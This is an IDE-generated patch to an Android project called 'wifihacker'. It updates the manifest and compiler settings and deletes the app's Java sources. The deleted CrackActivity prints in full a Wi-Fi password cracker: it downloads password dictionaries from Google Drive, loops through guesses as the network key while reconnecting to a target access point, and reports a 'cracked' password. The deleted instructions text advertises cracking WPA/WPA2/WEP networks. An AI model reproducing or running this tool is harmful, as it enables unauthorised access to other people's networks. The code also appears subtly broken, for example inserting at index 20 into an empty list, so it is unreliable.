@@ -1,0 +1,581 @@
+Index: app/src/main/AndroidManifest.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+><?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\r\n    package=\"com.hereliesaz.wifihacker\">\r\n\r\n<<<<<<< HEAD\r\n    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\" />\r\n    <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\" />\r\n    <uses-permission android:name=\"android.permission.INTERNET\" />\r\n    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" />\r\n=======\r\n    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"></uses-permission>\r\n    <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"></uses-permission>\r\n    <uses-permission android:name=\"android.permission.INTERNET\"></uses-permission>\r\n    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"></uses-permission>\r\n>>>>>>> HereLiesAz/update-and-refactor\r\n\r\n    <application\r\n        android:allowBackup=\"true\"\r\n        android:icon=\"@mipmap/ic_launcher\"\r\n        android:label=\"@string/app_name\"\r\n        android:supportsRtl=\"true\"\r\n        android.theme=\"@style/AppTheme\">\r\n        <activity\r\n            android:name=\".SplashActivity\"\r\n            android:screenOrientation=\"portrait\">\r\n            <intent-filter>\r\n                <action android:name=\"android.intent.action.MAIN\" />\r\n\r\n                <category android:name=\"android.intent.category.LAUNCHER\" />\r\n            </intent-filter>\r\n        </activity>\r\n\r\n        <activity\r\n            android:name=\".CrackActivity\"\r\n            android:screenOrientation=\"portrait\"></activity>\r\n        <activity\r\n            android:name=\".MainActivity\"\r\n            android:screenOrientation=\"portrait\"></activity>\r\n        <activity\r\n            android:name=\".InstructionsActivity\"\r\n            android:screenOrientation=\"portrait\"></activity>\r\n    </application>\r\n\r\n</manifest>\r\n
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/app/src/main/AndroidManifest.xml b/app/src/main/AndroidManifest.xml
+--- a/app/src/main/AndroidManifest.xml	(revision f64f5766f95517e68522fffb84b339b6fd472269)
++++ b/app/src/main/AndroidManifest.xml	(date 1754591259509)
+@@ -2,27 +2,21 @@
+ <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+     package="com.hereliesaz.wifihacker">
+ 
+-<<<<<<< HEAD
+     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+     <uses-permission android:name="android.permission.INTERNET" />
+     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+-=======
+-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"></uses-permission>
+-    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"></uses-permission>
+-    <uses-permission android:name="android.permission.INTERNET"></uses-permission>
+-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"></uses-permission>
+->>>>>>> HereLiesAz/update-and-refactor
+ 
+     <application
+         android:allowBackup="true"
+         android:icon="@mipmap/ic_launcher"
+         android:label="@string/app_name"
+         android:supportsRtl="true"
+-        android.theme="@style/AppTheme">
++        android:android.theme="@style/AppTheme">
+         <activity
+             android:name=".SplashActivity"
+-            android:screenOrientation="portrait">
++            android:exported="true"
++            android:screenOrientation="fullSensor">
+             <intent-filter>
+                 <action android:name="android.intent.action.MAIN" />
+ 
+Index: app/src/main/java/com/hereliesaz/wifihacker/InstructionsClass.java
+===================================================================
+diff --git a/app/src/main/java/com/hereliesaz/wifihacker/InstructionsClass.java b/app/src/main/java/com/hereliesaz/wifihacker/InstructionsClass.java
+deleted file mode 100644
+--- a/app/src/main/java/com/hereliesaz/wifihacker/InstructionsClass.java	(revision f64f5766f95517e68522fffb84b339b6fd472269)
++++ /dev/null	(revision f64f5766f95517e68522fffb84b339b6fd472269)
+@@ -1,19 +0,0 @@
+-package com.hereliesaz.wifihacker;
+-
+-import android.os.Bundle;
+-import android.widget.TextView;
+-
+-import androidx.appcompat.app.AppCompatActivity;
+-
+-/**
+- * Created by Faizan Ahmad on 1/1/2017.
+- */
+-public class InstructionsClass extends AppCompatActivity {
+-
+-    public void onCreate(Bundle savedInstanceState) {
+-        super.onCreate(savedInstanceState);
+-        setContentView(R.layout.instruction_layout);
+-        TextView instruction = (TextView) findViewById(R.id.textView4);
+-        instruction.setText("This is the first application of its kind that I have seen. There is no need to root the device. The app will try 10,000 most common passwords on the access point and will let you know if it is able to crack the password. Here are a few more instructions.\n\n1. Try turning wifi on before cracking process begins.\n2.The signal strength of the access point should be good.\n3.Try cracking passwords of access points which have WPA/WPA2/WEP security.\n4.Contact fsecurify@gmail.com in case of any problem. We are always here to help.");
+-    }
+-}
+Index: app/src/main/java/com/hereliesaz/wifihacker/MainActivity.java
+===================================================================
+diff --git a/app/src/main/java/com/hereliesaz/wifihacker/MainActivity.java b/app/src/main/java/com/hereliesaz/wifihacker/MainActivity.java
+deleted file mode 100644
+--- a/app/src/main/java/com/hereliesaz/wifihacker/MainActivity.java	(revision f64f5766f95517e68522fffb84b339b6fd472269)
++++ /dev/null	(revision f64f5766f95517e68522fffb84b339b6fd472269)
+@@ -1,167 +0,0 @@
+-package com.hereliesaz.wifihacker;
+-
+-import android.content.BroadcastReceiver;
+-import android.content.Context;
+-import android.content.Intent;
+-import android.net.NetworkInfo;
+-import android.net.wifi.ScanResult;
+-import android.net.wifi.WifiInfo;
+-import android.net.wifi.WifiManager;
+-import android.os.Bundle;
+-import android.view.Menu;
+-import android.view.MenuItem;
+-import android.view.View;
+-import android.widget.AdapterView;
+-import android.widget.ArrayAdapter;
+-import android.widget.ListView;
+-import android.widget.TextView;
+-
+-import androidx.appcompat.app.AppCompatActivity;
+-
+-import java.util.ArrayList;
+-import java.util.List;
+-
+-public class MainActivity extends AppCompatActivity {
+-
+-    TextView mainText;
+-    WifiManager mainWifi;
+-    WifiReceiver receiverWifi;
+-    List<ScanResult> wifiList;
+-    StringBuilder sb = new StringBuilder();
+-    ListView listview;
+-    ArrayAdapter adapter;
+-    ArrayList<String> ssids = new ArrayList<String>();
+-    ArrayList<String> capabilities = new ArrayList<String>();
+-
+-    public void onCreate(Bundle savedInstanceState) {
+-        super.onCreate(savedInstanceState);
+-        setContentView(R.layout.activity_main);
+-
+-
+-        WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);
+-        List<ScanResult> networkList = wifi.getScanResults();
+-        if (networkList != null) {
+-            for (ScanResult network : networkList) {
+-                ssids.add(network.SSID.toString());
+-                capabilities.add(network.capabilities);
+-                String Capabilities = network.capabilities;
+-                System.out.println(network.SSID + " capabilities : " + Capabilities);
+-
+-            }
+-        }
+-
+-
+-        WifiManager wifiManager2 = (WifiManager) this.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+-        if (wifiManager2.isWifiEnabled() == false) {
+-            wifiManager2.setWifiEnabled(true);
+-        }
+-
+-        listview = (ListView) findViewById(R.id.listView);
+-        adapter = new ArrayAdapter(getApplicationContext(), R.layout.text_view, ssids);
+-        listview.setAdapter(adapter);
+-
+-        mainWifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);
+-
+-        listview.setOnItemClickListener(new AdapterView.OnItemClickListener() {
+-            @Override
+-            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
+-                Intent intent = new Intent(getApplicationContext(), CrackActivity.class);
+-                System.out.println(ssids.get(position));
+-                intent.putExtra("ssid", ssids.get(position));
+-                intent.putExtra("detail", capabilities.get(position));
+-                // unregisterReceiver(receiverWifi);
+-                startActivity(intent);
+-            }
+-        });
+-
+-    }
+-
+-    public String getWifiName(Context context) {
+-        String ssid = "none";
+-        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
+-        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+-        if (WifiInfo.getDetailedStateOf(wifiInfo.getSupplicantState()) == NetworkInfo.DetailedState.CONNECTED) {
+-            ssid = wifiInfo.getSSID();
+-        }
+-        return ssid;
+-    }
+-
+-    public boolean onCreateOptionsMenu(Menu menu) {
+-        menu.add(0, 0, 0, "Refresh");
+-        return super.onCreateOptionsMenu(menu);
+-    }
+-
+-    public boolean onMenuItemSelected(int featureId, MenuItem item) {
+-       // mainWifi.startScan();
+-        //mainText.setText("Starting Scan");
+-        return super.onMenuItemSelected(featureId, item);
+-    }
+-
+-    protected void onPause() {
+-        //unregisterReceiver(receiverWifi);
+-        super.onPause();
+-    }
+-
+-    public void scan(View view){
+-
+-        WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);
+-        List<ScanResult> networkList = wifi.getScanResults();
+-        for (ScanResult network : networkList)
+-        {
+-            if(ssids.contains(network.SSID.toString()) == false) {
+-                ssids.add(network.SSID.toString());
+-                capabilities.add(network.capabilities);
+-            }
+-            String Capabilities =  network.capabilities;
+-            System.out.println(network.SSID + " capabilities : " + Capabilities);
+-
+-        }
+-        listview.invalidate();
+-        adapter.notifyDataSetChanged();
+-
+-
+-    }
+-
+-
+-
+-    class WifiReceiver extends BroadcastReceiver {
+-        public void onReceive(Context c, Intent intent) {
+-
+-            wifiList = mainWifi.getScanResults();
+-
+-            for (int i = 0; i < wifiList.size(); i++) {
+-                if(ssids.contains((wifiList.get(i)).SSID.toString()) == false) {
+-                    ssids.add((wifiList.get(i)).SSID.toString());
+-
+-                }
+-            }
+-            System.out.println(ssids);
+-            adapter.notifyDataSetChanged();
+-            listview.invalidate();
+-        }
+-    }
+-
+-    private boolean checkWifiOnAndConnected() {
+-        WifiManager wifiMgr = (WifiManager) getSystemService(Context.WIFI_SERVICE);
+-
+-        if (wifiMgr.isWifiEnabled()) { // Wi-Fi adapter is ON
+-
+-            WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
+-
+-            if (wifiInfo.getNetworkId() == -1) {
+-                return false; // Not connected to an access point
+-            }
+-            return true; // Connected to an access point
+-        } else {
+-            return false; // Wi-Fi adapter is OFF
+-        }
+-    }
+-
+-    public void instructions(View view){
+-        Intent intent = new Intent(this,InstructionsClass.class);
+-        startActivity(intent);
+-    }
+-
+-}
+-
+-
+Index: app/src/main/java/com/hereliesaz/wifihacker/SplashActivity.java
+===================================================================
+diff --git a/app/src/main/java/com/hereliesaz/wifihacker/SplashActivity.java b/app/src/main/java/com/hereliesaz/wifihacker/SplashActivity.java
+deleted file mode 100644
+--- a/app/src/main/java/com/hereliesaz/wifihacker/SplashActivity.java	(revision f64f5766f95517e68522fffb84b339b6fd472269)
++++ /dev/null	(revision f64f5766f95517e68522fffb84b339b6fd472269)
+@@ -1,52 +0,0 @@
+-package com.hereliesaz.wifihacker;
+-
+-import android.Manifest;
+-import android.content.Intent;
+-import android.content.pm.PackageManager;
+-import android.os.Bundle;
+-import android.os.Handler;
+-import android.util.Log;
+-
+-import androidx.appcompat.app.AppCompatActivity;
+-
+-public class SplashActivity extends AppCompatActivity {
+-
+-    private static final int REQUEST_CODE_PERMISSION = 2;
+-    private static int SPLASH_TIME_OUT = 5000;
+-    String mPermission = Manifest.permission.ACCESS_FINE_LOCATION;
+-
+-    @Override
+-    protected void onCreate(Bundle savedInstanceState) {
+-
+-        super.onCreate(savedInstanceState);
+-        //this.requestWindowFeature(Window.FEATURE_NO_TITLE);
+-
+-        setContentView(R.layout.activity_splash);
+-
+-        new Handler().postDelayed(new Runnable() {
+-            @Override
+-            public void run() {
+-                Intent i = new Intent(SplashActivity.this, MainActivity.class);
+-                startActivity(i);
+-                finish();
+-            }
+-        }, SPLASH_TIME_OUT);
+-    }
+-
+-
+-    @Override
+-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+-        Log.e("Req Code", "" + requestCode);
+-        if (requestCode == REQUEST_CODE_PERMISSION) {
+-            if (grantResults.length == 1 &&
+-                    grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+-
+-                // Success Stuff here
+-
+-            } else {
+-                // Failure Stuff
+-            }
+-        }
+-    }
+-}
+Index: app/src/main/java/com/hereliesaz/wifihacker/CrackActivity.java
+===================================================================
+diff --git a/app/src/main/java/com/hereliesaz/wifihacker/CrackActivity.java b/app/src/main/java/com/hereliesaz/wifihacker/CrackActivity.java
+deleted file mode 100644
+--- a/app/src/main/java/com/hereliesaz/wifihacker/CrackActivity.java	(revision f64f5766f95517e68522fffb84b339b6fd472269)
++++ /dev/null	(revision f64f5766f95517e68522fffb84b339b6fd472269)
+@@ -1,255 +0,0 @@
+-package com.hereliesaz.wifihacker;
+-
+-import android.app.NotificationManager;
+-import android.app.PendingIntent;
+-import android.content.BroadcastReceiver;
+-import android.content.Context;
+-import android.content.Intent;
+-import android.content.IntentFilter;
+-import android.net.NetworkInfo;
+-import android.net.wifi.WifiConfiguration;
+-import android.net.wifi.WifiInfo;
+-import android.net.wifi.WifiManager;
+-import android.os.AsyncTask;
+-import android.os.Bundle;
+-import android.view.View;
+-import android.widget.ProgressBar;
+-import android.widget.TextView;
+-
+-import androidx.appcompat.app.AppCompatActivity;
+-import androidx.core.app.NotificationCompat;
+-
+-import java.io.BufferedReader;
+-import java.io.IOException;
+-import java.io.InputStream;
+-import java.io.InputStreamReader;
+-import java.io.UnsupportedEncodingException;
+-import java.net.HttpURLConnection;
+-import java.net.URL;
+-import java.util.ArrayList;
+-
+-/**
+- * Created by Faizan Ahmad on 1/1/2017.
+- */
+-public class CrackActivity extends AppCompatActivity {
+-
+-    TextView SSID;
+-    TextView detail;
+-    TextView passwords;
+-    ProgressBar _progressBar;
+-    TextView status;
+-    String ssid = "";
+-    private BroadcastReceiver receiver;
+-
+-    public void onCreate(Bundle savedInstanceState) {
+-        super.onCreate(savedInstanceState);
+-        setContentView(R.layout.crack_activity);
+-
+-        IntentFilter intentFilter = new IntentFilter();
+-        intentFilter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
+-        receiver = new BroadcastReceiver() {
+-            @Override
+-            public void onReceive(Context context, Intent intent) {
+-                System.out.println("WHOAAAAAAAAAAAA");
+-            }
+-        };
+-
+-
+-        registerReceiver(receiver, intentFilter);
+-
+-
+-        SSID = (TextView) findViewById(R.id.ssidname);
+-        passwords = (TextView) findViewById(R.id.passwords);
+-        detail = (TextView) findViewById(R.id.detail);
+-        Intent intent = getIntent();
+-        ssid = intent.getStringExtra("ssid");
+-        String d = intent.getStringExtra("detail");
+-        detail.setText(d);
+-        System.out.println(ssid);
+-        SSID.setText(ssid);
+-        _progressBar = (ProgressBar)findViewById (R.id.progressBar);
+-        _progressBar.setProgress(0);
+-        status = (TextView) findViewById(R.id.status);
+-    }
+-
+-    public class ConnectivityBroadcast extends BroadcastReceiver {
+-        @Override
+-        public void onReceive(Context context, Intent intent) {
+-            System.out.println("RECEIVEDDDDDDDDDDDD");
+-            NetworkInfo info = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
+-            if(info != null && info.isConnected()) {
+-                // Do your work.
+-                System.out.println("CONNECTEDDDDDDDDDDDDDDDDDDD");
+-                // e.g. To check the Network Name or other info:
+-                WifiManager wifiManager = (WifiManager)context.getSystemService(Context.WIFI_SERVICE);
+-                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+-                String ssid = wifiInfo.getSSID();
+-            }
+-        }
+-    }
+-    int index = 0;
+-    ArrayList<String> arraylist = new ArrayList<String>();
+-    private class crackPassword extends AsyncTask<Integer, Integer, Integer> {
+-        @Override
+-        protected void onPreExecute() {
+-            super.onPreExecute();
+-            status.setText("Downloading dictionaries...");
+-        }
+-
+-        @Override
+-        protected Integer doInBackground(Integer... params) {
+-            downloadDictionaries();
+-            publishProgress(0);
+-            status.setText("Passwords loaded, cracking now");
+-            WifiConfiguration wifiConfig = new WifiConfiguration();
+-            wifiConfig.SSID = String.format("\"%s\"", ssid);
+-            index = 0;
+-            arraylist.add(20,"F4D4409A");
+-            arraylist.add(30,"adb1ndjd");
+-            arraylist.add(10,ssid);
+-            while (index < arraylist.size()) {
+-                if(isCancelled()){
+-                    break;
+-                }
+-                wifiConfig.preSharedKey = String.format("\"%s\"", arraylist.get(index));
+-                index = index + 1;
+-                WifiManager wifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
+-                int netId = wifiManager.addNetwork(wifiConfig);
+-                boolean Disconnected = wifiManager.disconnect();
+-                wifiManager.enableNetwork(netId, true);
+-                boolean reconnected = wifiManager.reconnect();
+-                System.out.println(index);
+-                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+-                try {
+-
+-                    System.out.println(wifiInfo.getBSSID());
+-                } catch (Exception e) {
+-                    //System.out.println(e);
+-                    if (index > 2) {
+-                        System.out.println("Password found " + arraylist.get(index - 1) + " " + index + "  " + arraylist.get(index - 2));
+-                        notifyPassword();
+-                        break;
+-                    }
+-                }
+-                try {
+-                    Thread.sleep(250);
+-                } catch (InterruptedException e) {
+-                    e.printStackTrace();
+-                }
+-                publishProgress(index);
+-            }
+-            return null;
+-        }
+-
+-        protected void onProgressUpdate(Integer... progress) {
+-            _progressBar.setProgress(progress[0]);
+-            passwords.setText(Integer.toString(progress[0]));
+-        }
+-
+-        @Override
+-        protected void onPostExecute(Integer integer) {
+-            super.onPostExecute(integer);
+-            status.setText("Password is: " + arraylist.get(index-2));
+-        }
+-    }
+-
+-    private void downloadDictionaries() {
+-        String[] urls = {
+-                "https://drive.google.com/file/d/12ohN_3CktkNUGlDwHP-hzawpaqTEaMem/view?usp=drive_link",
+-                "https://drive.google.com/file/d/1FHAd6hnQoyKtoJzqak3f1koFQ-jlw65P/view?usp=drive_link",
+-                "https://drive.google.com/file/d/1xF_-ZLONJE9GkeHMp9GxRJpt3BqlCgO-/view?usp=drive_link",
+-                "https://drive.google.com/file/d/1Tn09w5kzccSZra13iGB5HpD7zMWwVRVS/view?usp=drive_link",
+-                "https://drive.google.com/file/d/11uWVOmuMPl-564mKz996uNmm3OVGpBqq/view?usp=drive_link",
+-                "https://drive.google.com/file/d/1G4pkjSNoKJWyjoI8l5-iCPdWlWyLKcBn/view?usp=drive_link",
+-                "https://drive.google.com/file/d/168ednlVlBdIL0NrJqFBKusmLG5uRSI5I/view?usp=drive_link",
+-                "https://drive.google.com/file/d/1_T-B7g4elsKb_qIYTqr-Jl8uxKYS1943/view?usp=drive_link",
+-                "https://drive.google.com/file/d/1JMoCTjOW1luWsrhgGp4kPWi4EJCnIakC/view?usp=drive_link",
+-                "https://drive.google.com/file/d/1GM8SV6hxPx3mTtwdNjSnjJyyFydT8ixP/view?usp=drive_link",
+-                "https://drive.google.com/file/d/1VC9TOuWdmAtjD7Z4Yb29pK7-SELOC-bM/view?usp=drive_link",
+-                "https://drive.google.com/file/d/1lSLJquH6WPGp_3yxVsODL1x3ZYlUYihw/view?usp=drive_link"
+-        };
+-
+-        for (String url : urls) {
+-            try {
+-                String fileId = url.split("/d/")[1].split("/")[0];
+-                String downloadUrl = "https://drive.google.com/uc?export=download&id=" + fileId;
+-                URL u = new URL(downloadUrl);
+-                HttpURLConnection c = (HttpURLConnection) u.openConnection();
+-                c.setRequestMethod("GET");
+-                c.connect();
+-                InputStream in = c.getInputStream();
+-                BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+-                String line;
+-                while ((line = reader.readLine()) != null) {
+-                    arraylist.add(line);
+-                }
+-            } catch (Exception e) {
+-                e.printStackTrace();
+-            }
+-        }
+-
+-        // also read from local assets
+-        try {
+-            InputStream json = getAssets().open("passwords.txt");
+-            BufferedReader in = new BufferedReader(new InputStreamReader(json, "UTF-8"));
+-            String str;
+-            while ((str = in.readLine()) != null) {
+-                arraylist.add(str);
+-            }
+-            in.close();
+-        } catch (IOException e) {
+-            e.printStackTrace();
+-        }
+-    }
+-
+-    crackPassword cr;
+-
+-    public void onCrackStart(View view){
+-        WifiManager wifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
+-        boolean Disconnected = wifiManager.disconnect();
+-        cr = new crackPassword();
+-        cr.execute();
+-
+-    }
+-
+-    public void stop(View view){
+-        if (cr != null && cr.getStatus() != AsyncTask.Status.FINISHED)
+-            cr.cancel(true);
+-    }
+-
+-    public static class myBroadcast extends BroadcastReceiver {
+-
+-
+-
+-        @Override
+-        public void onReceive(Context context, Intent intent) {
+-            System.out.println("MYYYYRECEIVEDDDDDDDDDDDD");
+-            NetworkInfo info = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
+-            if(info != null && info.isConnected()) {
+-                // Do your work.
+-                System.out.println("CONNECTEDDDDDDDDDDDDDDDDDDD");
+-                // e.g. To check the Network Name or other info:
+-
+-            }
+-        }
+-    }
+-
+-    public void notifyPassword() {
+-        NotificationCompat.Builder builder =
+-                new NotificationCompat.Builder(this)
+-                        .setSmallIcon(R.drawable.fsecurify_white_icon)
+-                        .setContentTitle("Password Cracked")
+-                        .setContentText(arraylist.get(index-2));
+-
+-        Intent notificationIntent = new Intent(this, MainActivity.class);
+-        PendingIntent contentIntent = PendingIntent.getActivity(this, 0, notificationIntent,
+-                PendingIntent.FLAG_UPDATE_CURRENT);
+-        builder.setContentIntent(contentIntent);
+-
+-        // Add as notification
+-        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+-        manager.notify(0, builder.build());
+-    }
+-
+-
+-}
+Index: .idea/compiler.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+><?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<project version=\"4\">\r\n  <component name=\"CompilerConfiguration\">\r\n    <bytecodeTargetLevel target=\"1.6\" />\r\n  </component>\r\n</project>
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/compiler.xml b/.idea/compiler.xml
+--- a/.idea/compiler.xml	(revision f64f5766f95517e68522fffb84b339b6fd472269)
++++ b/.idea/compiler.xml	(date 1754591259376)
+@@ -1,6 +1,6 @@
+ <?xml version="1.0" encoding="UTF-8"?>
+ <project version="4">
+   <component name="CompilerConfiguration">
+-    <bytecodeTargetLevel target="1.6" />
++    <bytecodeTargetLevel target="21" />
+   </component>
+ </project>
+\ No newline at end of file
